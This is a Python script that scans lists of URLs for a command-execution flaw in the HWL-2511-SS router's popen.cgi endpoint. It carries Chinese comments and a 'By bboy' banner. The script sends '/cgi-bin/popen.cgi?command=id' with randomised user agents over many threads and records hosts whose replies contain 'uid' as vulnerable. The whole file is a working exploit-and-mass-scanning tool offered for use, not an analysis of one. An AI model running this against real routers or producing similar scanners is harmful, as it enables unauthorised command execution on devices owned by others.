import requests
import re
import sys
import urllib3
from argparse import ArgumentParser
import threadpool
from urllib import parse
from time import time
import random
#U2FsdGVkX18KyoowAhsCFuSm4Tak/zdc3QB1KeE+4T8s9GJdTLa897wjrzd/vKNhi1cRe51Cn9O0tjXvvPSL2NJv0WcLkCqLZ8u20itGvGSUmXlSGVEldfhItoZgNIrz
#haoxiongdi666

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
filename = sys.argv[1]
url_list=[]

#随机ua
def get_ua():
	first_num = random.randint(55, 62)
	third_num = random.randint(0, 3200)
	fourth_num = random.randint(0, 140)
	os_type = [
		'(Windows NT 6.1; WOW64)', '(Windows NT 10.0; WOW64)',
		'(Macintosh; Intel Mac OS X 10_12_6)'
	]
	chrome_version = 'Chrome/{}.0.{}.{}'.format(first_num, third_num, fourth_num)

	ua = ' '.join(['Mozilla/5.0', random.choice(os_type), 'AppleWebKit/537.36',
				   '(KHTML, like Gecko)', chrome_version, 'Safari/537.36']
				  )
	return ua

proxies={'http': 'http://127.0.0.1:8080',
        'https': 'https://127.0.0.1:8080'}



def wirte_targets(vurl, filename):
	with open(filename, "a+") as f:
		f.write(vurl + "\n")

#payload
def fuzz(url):
	url = parse.urlparse(url)
	url1 = url.scheme + '://' + url.netloc +'/cgi-bin/popen.cgi?command=id'
#	print(url1)

	try:
		headers = {'User-Agent': get_ua()}
		r=requests.get(url1,proxies=proxies,headers=headers,verify=False,allow_redirects=True,timeout=10)
	#print(r)
	#	print(r.status_code)
#		if r.status_code == 200:
		if r.status_code == 200 and 'uid' in r.text:
			print('\033[32m[+]{} \033[0m'.format(url1))
			wirte_targets(url1,"vuln.txt")
		else :
			print('\033[31m[-]%s \033[0m' %url1)
	except Exception as e:
		print('[!]%s is timeout' %url1)


#多线程
def multithreading(url_list, pools=5):
	works = []
	for i in url_list:
		# works.append((func_params, None))
		works.append(i)
	# print(works)
	pool = threadpool.ThreadPool(pools)
	reqs = threadpool.makeRequests(fuzz, works)
	[pool.putRequest(req) for req in reqs]
	pool.wait()


if __name__ == '__main__':
	show = r'''

	HWL-2511-SS路由器popen.cgi命令执行漏洞       
	                                                                    
	                                                                    
                                      	By bboy
	'''
	print(show + '\n')
	arg=ArgumentParser(description='HWL-2511-SS路由器popen.cgi命令执行漏洞 By bboy')
	arg.add_argument("-u",
						"--url",
						help="Target URL; Example:http://ip:port")
	arg.add_argument("-f",
						"--file",
						help="Target URL; Example:url.txt")
	args=arg.parse_args()
	url=args.url
	filename=args.file
	start=time()
	if url != None and filename == None:
		fuzz(url)
	elif url == None and filename != None:
		for i in open(filename):
			i=i.replace('\n','')
			url_list.append(i)
		multithreading(url_list,10)
	end=time()
	print('任务完成，用时%d' %(end-start))
